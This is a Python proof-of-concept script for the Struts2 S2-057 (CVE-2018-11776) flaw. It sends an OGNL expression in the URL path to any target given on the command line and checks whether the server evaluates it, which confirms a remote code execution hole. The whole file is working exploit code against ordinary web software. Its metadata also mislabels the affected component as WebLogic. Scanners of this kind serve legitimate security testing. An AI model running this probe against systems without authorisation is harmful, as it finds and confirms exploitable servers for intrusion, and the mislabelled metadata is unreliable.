#!/usr/bin/env python3
# From: JIGUANG s1@jiguang.in
# 


import requests,sys,random,json
requests.packages.urllib3.disable_warnings()

from urllib import parse


def info():

    s2_057 = {"id": "CVE-2018-11776", "kind": "web", "type": "Remote Command Execution", "name": "Struts2 \u547d\u4ee4\u6267\u884c\u6f0f\u6d1eCVE-2018-11776", "status": "high", "description": "", "expansion": "", "resolution": "", "method": "POST", "payload": "", "header": "", "body": "", "affectedComponent": [{"name": "WebLogic", "description": "Struts2\u662f\u4e00\u4e2a\u57fa\u4e8eMVC\u8bbe\u8ba1\u6a21\u5f0f\u7684Web\u5e94\u7528\u6846\u67b6\uff0c\u5b83\u672c\u8d28\u4e0a\u76f8\u5f53\u4e8e\u4e00\u4e2aservlet\uff0c\u5728MVC\u8bbe\u8ba1\u6a21\u5f0f\u4e2d\uff0cStruts2\u4f5c\u4e3a\u63a7\u5236\u5668(Controller)\u6765\u5efa\u7acb\u6a21\u578b\u4e0e\u89c6\u56fe\u7684\u6570\u636e\u4ea4\u4e92"}]}

def poc(url):

    try:

        retval = False
        headers = dict()
        headers['User-Agent'] = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:61.0) Gecko/20100101 Firefox/61.0'
        r1 = random.randint(10000,99999)
        r2 = random.randint(10000,99999)
        r3 = r1 + r2

        urlOne = url

        res = requests.get(url=urlOne,timeout=6,allow_redirects=False,verify=False)

        if res.status_code == 200:

            urlTemp = parse.urlparse(urlOne)

            urlTwo = urlTemp.scheme + '://' + urlTemp.netloc + '/${%s+%s}/index.action'%(r1,r2)

            res = requests.get(url=urlTwo,timeout=6,allow_redirects=False,verify=False)

            if res.status_code == 302 and res.headers.get('Location') is not None and str(r3) in res.headers.get('Location'):

                urlThree = res.headers.get('Location')
                res = requests.get(url=urlThree,timeout=6,allow_redirects=False,verify=False)

                retval |= str(r3) in res.text

    except:pass
    finally:

        if retval:

            print('URL {} 存在s2-057 CVE-2018-11776 漏洞!'.format(url))

        else:
            print('URL {} 不存在s2-057 CVE-2018-11776 漏洞!'.format(url))




if __name__ == '__main__':

	args = sys.argv[1]
	poc(url=args)
